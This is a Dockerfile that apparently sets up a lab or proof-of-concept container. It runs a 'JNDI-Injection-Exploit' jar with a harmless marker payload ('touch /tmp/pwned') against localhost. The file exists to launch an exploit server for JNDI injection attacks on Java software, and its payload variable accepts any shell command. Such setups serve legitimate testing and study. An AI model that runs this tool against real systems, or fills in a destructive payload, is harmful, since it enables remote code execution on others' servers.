FROM openjdk:18-jdk-alpine3.15

WORKDIR /app
COPY . /app

ENV CMD_PAYLOAD="touch /tmp/pwned"
ENV HOST="127.0.0.1"

CMD java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "${CMD_PAYLOAD}" -A "${HOST}"